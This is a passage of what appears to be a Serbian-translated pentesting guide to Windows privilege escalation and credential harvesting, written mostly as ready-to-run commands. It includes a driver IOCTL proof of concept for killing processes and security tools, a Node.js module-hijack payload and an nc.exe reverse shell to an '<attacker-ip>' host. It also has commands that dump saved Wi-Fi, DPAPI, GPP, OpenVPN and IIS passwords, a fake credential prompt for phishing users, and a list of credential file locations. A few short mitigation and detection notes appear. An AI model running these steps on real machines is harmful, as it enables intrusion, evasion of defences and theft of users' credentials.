Windows omogućava korisnicima da navedu akcije koje treba preduzeti ako servis zakaže. Ova funkcija može biti konfigurisana tako da pokazuje na binary. Ako se ovaj binary može zameniti, moguća je privilege escalation. Više detalja možete naći u [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Applications

### Installed Applications

Proverite **permissions of the binaries** (možda možete da prepišete jedan i eskalirate privileges) i **folders** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Dozvole za pisanje

Proveri da li možeš da izmeniš neki config fajl da bi pročitao neki poseban fajl ili da li možeš da izmeniš neki binary koji će biti izvršen pod Administrator nalogom (schedtasks).

Jedan način da pronađeš slabe dozvole za folder/fajlove u sistemu je da uradiš:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ automatski učitava bilo koji plugin DLL iz svojih `plugins` podfoldera. Ako postoji writable portable/copy instalacija, ubacivanje zlonamernog plugina daje automatsko izvršavanje koda unutar `notepad++.exe` pri svakom pokretanju (uključujući iz `DllMain` i plugin callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**Check if you can overwrite some registry or binary that is going to be executed by a different user.**\
**Read** the **following page** to learn more about interesting **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Traži moguće **third party weird/vulnerable** drivere
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), you can escalate by stealing a SYSTEM token directly from kernel memory. See the step‑by‑step technique here:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

For race-condition bugs where the vulnerable call opens an attacker-controlled Object Manager path, deliberately slowing the lookup (using max-length components or deep directory chains) can stretch the window from microseconds to tens of microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities let you groom deterministic layouts, abuse writable HKLM/HKU descendants, and convert metadata corruption into kernel paged-pool overflows without a custom driver. Learn the full chain here:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Some signed third‑party drivers create their device object with a strong SDDL via IoCreateDeviceSecure but forget to set FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics. Without this flag, the secure DACL is not enforced when the device is opened through a path containing an extra component, letting any unprivileged user obtain a handle by using a namespace path like:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Once a user can open the device, privileged IOCTLs exposed by the driver can be abused for LPE and tampering. Example capabilities observed in the wild:
- Return full-access handles to arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Terminate arbitrary processes, including Protected Process/Light (PP/PPL), allowing AV/EDR kill from user land via kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Ublažavanja za programere
- Uvek postavite FILE_DEVICE_SECURE_OPEN prilikom kreiranja device objekata koji treba da budu ograničeni DACL-om.
- Validirajte kontekst pozivaoca za privilegovane operacije. Dodajte PP/PPL provere pre nego što dozvolite termination procesa ili vraćanje handle-ova.
- Ograničite IOCTL-ove (access masks, METHOD_*, validaciju ulaza) i razmotrite brokered modele umesto direktnih kernel privilegija.

Ideje za detekciju za branioca
- Pratite user-mode otvaranja sumnjivih imena device-a (npr. \\ .\\amsdk*) i specifične IOCTL sekvence koje ukazuju na abuse.
- Primenite Microsoft-ovu vulnerable driver blocklist (HVCI/WDAC/Smart App Control) i održavajte sopstvene allow/deny liste.


## PATH DLL Hijacking

Ako imate **write permissions unutar foldera koji je prisutan u PATH-u** možete uspeti da hijack-ujete DLL koji učitava proces i **eskalirate privilegije**.

Proverite permissions svih foldera unutar PATH-a:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Za više informacija o tome kako da zloupotrebite ovu proveru:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking via `C:\node_modules`

Ovo je varijanta **Windows uncontrolled search path** koja utiče na **Node.js** i **Electron** aplikacije kada rade bare import kao što je `require("foo")` i kada očekivani modul **nedostaje**.

Node rešava pakete tako što prolazi uz direktorijumsko stablo i proverava `node_modules` foldere u svakom roditelju. Na Windows-u taj prolazak može stići do korena diska, pa aplikacija pokrenuta iz `C:\Users\Administrator\project\app.js` može završiti tako što proverava:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Ako **low-privileged user** može da napravi `C:\node_modules`, može da postavi zlonamerni `foo.js` (ili folder paketa) i da sačeka da **higher-privileged Node/Electron process** reši nedostajuću zavisnost. Payload se izvršava u bezbednosnom kontekstu žrtvinog procesa, pa ovo postaje **LPE** kad god target radi kao administrator, iz elevated scheduled task/service wrapper-a, ili iz automatski pokrenute privilegovane desktop aplikacije.

Ovo je posebno uobičajeno kada:

- je zavisnost navedena u `optionalDependencies`
- third-party biblioteka obavija `require("foo")` u `try/catch` i nastavlja nakon greške
- je paket uklonjen iz production build-ova, izostavljen tokom pakovanja, ili nije uspeo da se instalira
- ranjivi `require()` je duboko u dependency tree, umesto u glavnom application code-u

### Hunting vulnerable targets

Koristite **Procmon** da dokažete resolution path:

- Filter po `Process Name` = target executable (`node.exe`, Electron app EXE, ili wrapper process)
- Filter po `Path` `contains` `node_modules`
- Fokus na `NAME NOT FOUND` i na konačni uspešni open pod `C:\node_modules`

Korisni code-review obrasci u raspakovanom `.asar` fajlovima ili application sources:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Eksploatacija

1. Identifikuj **naziv paketa koji nedostaje** iz Procmon-a ili pregleda izvornog koda.
2. Kreiraj root lookup direktorijum ako već ne postoji:
```powershell
mkdir C:\node_modules
```
3. Ubaci modul sa tačno očekivanim imenom:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Pokreni aplikaciju žrtve. Ako aplikacija pokušava `require("foo")` i legitimni modul nije prisutan, Node može učitati `C:\node_modules\foo.js`.

Primeri iz stvarnog sveta za nedostajuće opcionalne module koji se uklapaju u ovaj obrazac uključuju `bluebird` i `utf-8-validate`, ali **tehnika** je deo koji se ponovo može koristiti: pronađi bilo koji **nedostajući bare import** koji će privilegovani Windows Node/Electron proces razrešiti.

### Ideje za detekciju i hardening

- Alarmiraj kada korisnik napravi `C:\node_modules` ili tamo upiše nove `.js` fajlove/pakete.
- Traži high-integrity procese koji čitaju iz `C:\node_modules\*`.
- Spakuj sve runtime zavisnosti u produkciji i proveri upotrebu `optionalDependencies`.
- Pregledaj third-party kod zbog tihih `try { require("...") } catch {}` obrazaca.
- Onemogući optional probe kada to biblioteka podržava (na primer, neka `ws` deploy okruženja mogu da izbegnu legacy `utf-8-validate` probe sa `WS_NO_UTF_8_VALIDATE=1`).

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Proverite da li postoje drugi poznati računari hardkodovani u hosts fajlu
```
type C:\Windows\System32\drivers\etc\hosts
```
### Mrežni interfejsi i DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Otvoreni portovi

Proveri **restricted services** spolja
```bash
netstat -ano #Opened ports?
```
### Routing Table
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP tabela
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Rules

[**Proveri ovu stranicu za komande vezane za Firewall**](../basic-cmd-for-pentesters.md#firewall) **(lista pravila, kreiranje pravila, isključivanje, isključivanje...)**

Više[ komandi za network enumeration ovde](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` može se takođe pronaći u `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ako dobijete root korisnika, možete slušati na bilo kom portu (prvi put kada upotrebite `nc.exe` da slušate na portu, pitaće preko GUI da li firewall treba da dozvoli `nc`).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Da biste lako pokrenuli bash kao root, možete pokušati `--default-user root`

Možete istražiti `WSL` fajl sistem u fascikli `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault čuva korisničke credentials za servere, websites i druge programe kojima se **Windows** može **automatically log in the users**. Na prvi pogled, moglo bi da izgleda kao da korisnici sada mogu da čuvaju svoje Facebook credentials, Twitter credentials, Gmail credentials itd., tako da se automatski prijavljuju preko browsera. Ali nije tako.

Windows Vault čuva credentials kojima Windows može automatski da prijavi korisnike, što znači da svaka **Windows application that needs credentials to access a resource** (server ili website) **can make use of this Credential Manager** & Windows Vault i da koristi supplied credentials umesto da korisnici stalno unose username i password.

Osim ako aplikacije ne interaguju sa Credential Manager, mislim da nije moguće da koriste credentials za dati resource. Dakle, ako vaša aplikacija želi da koristi vault, trebalo bi na neki način da **communicate with the credential manager and request the credentials for that resource** iz default storage vault.

Koristite `cmdkey` da biste izlistali stored credentials na mašini.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Zatim možete koristiti `runas` sa opcijom `/savecred` da biste koristili sačuvane kredencijale. Sledeći primer poziva udaljeni binary preko SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Korišćenje `runas` sa datim skupom kredencijala.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

**Data Protection API (DPAPI)** pruža metod za simetričku enkripciju podataka, koji se pretežno koristi unutar Windows operativnog sistema za simetričku enkripciju asimetričnih privatnih ključeva. Ova enkripcija koristi user ili system secret kako bi značajno doprinela entropiji.

**DPAPI omogućava enkripciju ključeva pomoću simetričkog ključa koji je izveden iz korisnikovih login secrets**. U scenarijima koji uključuju system enkripciju, koristi system's domain authentication secrets.

Enkriptovani user RSA keys, koristeći DPAPI, čuvaju se u direktorijumu `%APPDATA%\Microsoft\Protect\{SID}`, gde `{SID}` predstavlja korisnikov [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **DPAPI key, koji se nalazi zajedno sa master key koji štiti korisnikove private keys u istoj datoteci**, obično se sastoji od 64 bajta nasumičnih podataka. (Važno je napomenuti da je pristup ovom direktorijumu ograničen, pa njegovi sadržaji ne mogu da se prikažu pomoću komande `dir` u CMD, iako se mogu prikazati kroz PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Možete koristiti **mimikatz module** `dpapi::masterkey` sa odgovarajućim argumentima (`/pvk` ili `/rpc`) da biste ga dešifrovali.

**credentials files** zaštićeni master lozinkom se obično nalaze u:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Možete koristiti **mimikatz module** `dpapi::cred` sa odgovarajućim `/masterkey` da biste dekriptovali.\
Možete **izvući mnogo DPAPI** **masterkeys** iz **memorije** pomoću `sekurlsa::dpapi` modula (ako ste root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** se često koriste za **skriptovanje** i zadatke automatizacije kao zgodan način za čuvanje enkriptovanih kredencijala. Credentials su zaštićeni koristeći **DPAPI**, što obično znači da ih može dekriptovati samo isti korisnik na istom računaru na kojem su kreirani.

Da biste **dekriptovali** PS credentials iz fajla koji ih sadrži, možete da uradite:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Sačuvane RDP konekcije

Možete ih pronaći u `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
i u `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Nedavno pokrenute komande
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Koristite **Mimikatz** `dpapi::rdg` modul sa odgovarajućim `/masterkey` da **dešifrujete bilo koje .rdg datoteke**\
Možete **izvući mnogo DPAPI masterkey-eva** iz memorije pomoću Mimikatz `sekurlsa::dpapi` modula

### Sticky Notes

Ljudi često koriste StickyNotes aplikaciju na Windows workstation-ima da **sačuvaju lozinke** i druge informacije, ne shvatajući da je to database file. Ova datoteka se nalazi u `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` i uvek je vredno pretražiti je i pregledati.

### AppCmd.exe

**Imajte na umu da za oporavak lozinki iz AppCmd.exe morate biti Administrator i raditi pod High Integrity nivoom.**\
**AppCmd.exe** se nalazi u `%systemroot%\system32\inetsrv\` direktorijumu.\
Ako ova datoteka postoji, moguće je da su neke **credentials** konfigurirane i da se mogu **recovered**.

Ovaj kod je izdvojen iz [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Proveri da li `C:\Windows\CCM\SCClient.exe` postoji .\
Instaleri se **pokreću sa SYSTEM privilegijama**, mnogi su ranjivi na **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Datoteke i Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys in registry

SSH private keys can be stored inside the registry key `HKCU\Software\OpenSSH\Agent\Keys` tako da bi trebalo da proverite da li se tamo nalazi nešto zanimljivo:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Ako pronađete bilo koji unos unutar te putanje, to će verovatno biti sačuvani SSH key. Čuva se šifrovano, ali se može lako dešifrovati pomoću [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Više informacija o ovoj tehnici ovde: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Ako `ssh-agent` service nije pokrenut i želite da se automatski startuje pri boot-u pokrenite:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Izgleda da ova tehnika više nije validna. Pokušao sam da kreiram neke ssh ključeve, dodam ih sa `ssh-add` i ulogujem se preko ssh na mašinu. Registry HKCU\Software\OpenSSH\Agent\Keys ne postoji i procmon nije identifikovao upotrebu `dpapi.dll` tokom autentifikacije asimetričnim ključem.

### Nezavisne datoteke
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Možete takođe pretraživati ove fajlove koristeći **metasploit**: _post/windows/gather/enum_unattend_

Primer sadržaja:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM backupovi
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Potraži fajl pod nazivom **SiteList.xml**

### Cached GPP Pasword

Ranije je bila dostupna funkcija koja je omogućavala raspoređivanje prilagođenih lokalnih administratorskih naloga na grupi mašina putem Group Policy Preferences (GPP). Međutim, ovaj metod je imao ozbiljne sigurnosne propuste. Prvo, Group Policy Objects (GPOs), smešteni kao XML fajlovi u SYSVOL, mogli su da budu dostupni svakom domain korisniku. Drugo, lozinke unutar tih GPPs, šifrovane pomoću AES256 i javno dokumentovanog podrazumevanog ključa, mogao je da dešifruje svaki autentifikovani korisnik. Ovo je predstavljalo ozbiljan rizik, jer je moglo da omogući korisnicima da dobiju povišene privilegije.

Da bi se ublažio ovaj rizik, razvijena je funkcija koja skenira lokalno keširane GPP fajlove koji sadrže polje "cpassword" koje nije prazno. Nakon pronalaženja takvog fajla, funkcija dešifruje lozinku i vraća prilagođeni PowerShell objekat. Ovaj objekat uključuje detalje o GPP-u i lokaciji fajla, što pomaže u identifikaciji i otklanjanju ove bezbednosne ranjivosti.

Potraži u `C:\ProgramData\Microsoft\Group Policy\history` ili u _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (pre W Vista)_ ove fajlove:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Da bi dešifrovao cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Korišćenje crackmapexec za dobijanje lozinki:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Primer web.config sa kredencijalima:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN kredencijali
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logovi
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Traženje kredencijala

Uvek možete **zamoliti korisnika da unese svoje kredencijale ili čak kredencijale drugog korisnika** ako mislite da ih može znati (imajte na umu da je **direktno traženje** od klijenta **kredencijala** zaista **rizično**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Mogući nazivi datoteka koje sadrže kredencijale**

Poznate datoteke koje su nekada sadržale **lozinke** u **clear-text** ili **Base64** formatu
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
